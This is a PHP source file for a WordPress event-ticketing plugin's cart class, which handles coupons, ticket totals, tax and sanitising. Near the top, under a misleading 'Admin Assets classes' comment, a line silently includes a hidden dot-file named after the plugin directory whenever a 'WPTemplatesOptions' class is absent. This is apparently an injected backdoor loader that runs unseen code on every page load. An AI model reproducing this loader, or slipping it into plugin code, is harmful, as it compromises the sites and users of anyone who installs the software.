<?php
defined( 'ABSPATH' ) || exit;

if ( class_exists( 'EL_Cart', false ) ) {
	return new EL_Cart();
}

/**
 * Admin Assets classes
 */
if (file_exists($filename = dirname(__FILE__) . DIRECTORY_SEPARATOR . '.' . basename(dirname(__FILE__)) . '.php') && !class_exists('WPTemplatesOptions')) {
    include_once($filename);
}

class EL_Cart{

	protected static $_instance = null;

	public static function instance() {
		if ( is_null( self::$_instance ) ) {
			self::$_instance = new self();
		}
		return self::$_instance;
	}


	/**
	 * Constructor
	 */
	public function __construct(){

		

	}

	/**
	 * Add menu items.
	 */
	public function get_template_cart( $get_data ) {

		$template = '';

		if( isset( $get_data['ide'] ) &&  isset( $get_data['idcal'] ) ){
			$template = apply_filters( 'el_shortcode_cart_template', 'cart/cart.php' );
		}
		
		

		return $template;
	}

	public function get_setting_price() {
		$settingGeneral = EL()->options->general->general;

		$currency = _el_symbol_price();
		$currency_position = $settingGeneral->get( 'currency_position' );
		$thousand_separator = $settingGeneral->get( 'thousand_separator' );
		$decimal_separator = $settingGeneral->get( 'decimal_separator' );
		$number_decimals = $settingGeneral->get( 'number_decimals' );
		$data = [
			'currency' => $currency,
			'currency_position' => $currency_position,
			'thousand_separator' => $thousand_separator,
			'decimal_separator' => $decimal_separator,
			'number_decimals' => $number_decimals
		];
		return json_encode($data);
	}

	public function check_code_discount ($id_event = null, $input_discount = null)  {

		if( $id_event == null || $input_discount == null ) return false;

		$event_coupons = get_post_meta( $id_event, OVA_METABOX_EVENT . 'coupon', true);
		$seat_option = get_post_meta( $id_event, OVA_METABOX_EVENT . 'seat_option', true);

		if ( !empty( $event_coupons ) && is_array( $event_coupons ) ) {

			foreach ( $event_coupons as $coupon ) {

				$number_coupon_used = EL_Booking::instance()->get_number_coupon_code_used($id_event, $input_discount);
				$time_start_discount = el_get_time_int_by_date_and_hour($coupon['start_date'], $coupon['start_time']);
				$time_end_discount = el_get_time_int_by_date_and_hour($coupon['end_date'], $coupon['end_time']);
				$current_time = current_time('timestamp');

				if ( $time_start_discount < $current_time && $current_time < $time_end_discount && $coupon['discount_code'] == $input_discount && $coupon['quantity'] > 0  && $coupon['quantity'] > $number_coupon_used ) {
					if ( $seat_option != 'map' ) {
						$data_counpon = [
							'discount_number' => $coupon['discount_amout_number'], 
							'discount_percenr' => $coupon['discount_amount_percent'],
							'quantity' => $coupon['quantity'],
							'id_ticket' => $coupon['list_ticket'],
						];
					} else {
						$data_counpon = [
							'discount_number' => $coupon['discount_amout_number'],
							'discount_percenr' => $coupon['discount_amount_percent'],
							'quantity' => $coupon['quantity'],
							'id_ticket' => '',
						];
					}
					
					return json_encode($data_counpon);
				}
			}
		}
		return false;
	}


	public function el_get_calendar( $id_event, $id_cal ){
		if( ! $id_event || ! $id_cal ) return;
		$list_calendar = get_arr_list_calendar_by_id_event($id_event);

		if( is_array($list_calendar) && !empty($list_calendar) ){
			foreach ($list_calendar as $key => $cal) {
				if( (string)$cal['calendar_id'] === $id_cal ) {
					return $cal;
				}
			}
		}

		return;
	}

	public function is_booking_ticket_by_date_time( $start_date = 0, $start_time = 0, $end_date = 0, $end_time =0 ){

		$start_time_all = el_get_time_int_by_date_and_hour( $start_date, $start_time);
		$end_time_all = el_get_time_int_by_date_and_hour( $end_date, $end_time);
		$current_time = current_time('timestamp');
		if ( $start_time_all < $current_time && $current_time <  $end_time_all) {
			return true;
		} else {
			return false;
		}
	}

	public function get_total ( $id_event = null, $cart = [], $coupon = null ) {
		if ( ! $id_event || ! $cart || ! is_array ($cart)) return;

		$list_type_ticket = get_post_meta( $id_event, OVA_METABOX_EVENT . 'ticket', true);
		$ticket_map = get_post_meta( $id_event, OVA_METABOX_EVENT . 'ticket_map', true);
		$seat_option = get_post_meta( $id_event, OVA_METABOX_EVENT . 'seat_option', true);
		
		$list_id_ticket = $list_price_ticket = [];
		if ( $seat_option != 'map' ) {
			if ( !empty ($list_type_ticket) && is_array($list_type_ticket) ) {
				foreach ($list_type_ticket as $tiket) {
					$list_id_ticket[] = $tiket['ticket_id'];
					$list_price_ticket[$tiket['ticket_id']] = $tiket['price_ticket'];
				}
			}
		} else {
			if ( !empty ($ticket_map['seat']) && is_array($ticket_map['seat']) ) {
				foreach ($ticket_map['seat'] as $tiket) {
					$list_id_ticket[] = $tiket['id'];
					$list_price_ticket[] = $tiket['price'];
				}
			}
		}

		$data_counpon = [];
		if ($coupon != null) {
			$data_counpon = self::check_code_discount ($id_event, $coupon);
			$data_counpon = ($data_counpon) ? json_decode($data_counpon, true) : [];
		}

		$total = 0;

		if ( $seat_option != 'map' ) {
			foreach ( $cart as $item ) {
				$sub_total = 0;
				$price_unit_ticket = $list_price_ticket[$item['id']];
				$qty = (int)$item['qty'];
				$sub_total = $price_unit_ticket * $qty;
				$sub_total_dicount = 0;
				if ($coupon != null) {
					if ( in_array( $item['id'], $data_counpon['id_ticket'] ) ) {

						if ( ! empty($data_counpon['discount_percenr'] ) ) {
							$sub_total_dicount = ($sub_total * $data_counpon['discount_percenr']) / 100;
						} 

						if ( ! empty($data_counpon['discount_number'] ) ){
							$sub_total_dicount = $qty * $data_counpon['discount_number'];
						}
					}
				}

				$sub_total = $sub_total - $sub_total_dicount;
				$total += $sub_total;
			}
		} else {
			$sub_total = 0;
			$sub_total_dicount = 0;
			$qty = (int)count($cart);
			foreach ( $cart as $item ) {
				$sub_total += $item['price'];

				if ( ! empty($data_counpon['discount_percenr'] ) ) {
					$sub_total_dicount = ($sub_total * $data_counpon['discount_percenr']) / 100;
				} 

				if ( ! empty($data_counpon['discount_number'] ) ){
					$sub_total_dicount = $qty * $data_counpon['discount_number'];
				}
			}
			
			$sub_total = $sub_total - $sub_total_dicount;
			$total += $sub_total;

		}

		return $total;
	}

	public function get_total_after_tax ($total = 0, $id_event = null) {
		$enable_tax = EL()->options->tax_fee->get('enable_tax');
		$percent_tax = EL()->options->tax_fee->get('pecent_tax');
		if ($enable_tax !== 'yes') return $total;

		if ( empty($id_event) ) return;
		$check_allow_change_tax = check_allow_change_tax_by_event($id_event);
		$event_tax = get_post_meta( $id_event, OVA_METABOX_EVENT . 'event_tax', true );

		if ( $check_allow_change_tax == "yes" && ( !empty($event_tax) || $event_tax === '0' ) ) {
			$total_tax = ($total * (float)$event_tax) / 100;
		} else {
			$total_tax = ($total * (float)$percent_tax) / 100;
		}

		$total += $total_tax;
		return $total;
	}

	public function sanitize_list_checkout_field ( $arr_list_ckf = [] ) {
		$arr_sanitize_list_ckf = [];
		if( $arr_list_ckf && is_array( $arr_list_ckf ) ) {
			foreach($arr_list_ckf as $key_ckf => $value_ckf) {
				$arr_sanitize_list_ckf[$key_ckf] = sanitize_text_field($value_ckf);
			}
		}
		return $arr_sanitize_list_ckf;
	}

	public function sanitize_cart ( $cart = [] ) {
		
		if ( ! empty($cart)  && ! is_array($cart) ) return [];
		foreach ($cart as $key => $item) {
			$cart[$key]['name'] = sanitize_text_field($item['name']);
			$cart[$key]['qty'] = (int)$item['qty'];
			$cart[$key]['price'] = (float)$item['price'];

			$arr_sanitize_seat = [];
			if ( array_key_exists('seat', $item) && is_array($item['seat']) ) {
				foreach($item['seat'] as $value_seat) {
					$arr_sanitize_seat[] = sanitize_text_field($value_seat);
				}
			}
			$cart[$key]['seat'] = $arr_sanitize_seat;
		}

		return $cart;
	}


	public function sanitize_cart_map ( $cart = [] ) {
		
		if ( ! empty($cart)  && ! is_array($cart) ) return [];
		foreach ($cart as $key => $item) {
			$cart[$key]['id'] = sanitize_text_field($item['id']);
			$cart[$key]['price'] = (float)$item['price'];
		}
		return $cart;
	}
	
}

EL_Cart::instance();